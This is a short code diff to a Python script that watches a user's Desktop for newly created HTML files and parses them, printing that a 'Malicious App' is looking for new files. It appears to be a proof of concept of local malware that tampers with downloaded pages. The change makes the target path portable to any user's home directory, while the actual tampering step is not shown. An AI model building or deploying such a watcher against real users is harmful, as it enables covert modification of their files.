@@ -1,4 +1,5 @@
 import time, os
+from pathlib import Path
 from watchdog.observers import Observer
 from bs4 import BeautifulSoup
 from watchdog.events import LoggingEventHandler
@@ -18,7 +19,7 @@ def WriteFile(path, content):
     k.close()
 
 class Event(LoggingEventHandler):
-    def dispatch(self, event): 
+    def dispatch(self, event):  
         if not event.is_directory and event.src_path.split(".")[-1] in ["html"] and event.event_type=='created':
             soup = BeautifulSoup(ReadFile(event.src_path, True),'lxml')
             print("Malicious App Looking for new files in download folder.....")
@@ -37,7 +38,7 @@ class Event(LoggingEventHandler):
                 print(str(e))
                 pass
 
-path = '/Users/rohitcoder/Desktop'
+path = str(Path.home())+'/Desktop'
 event_handler = Event()
 observer = Observer()
 observer.schedule(event_handler, path, recursive=True)
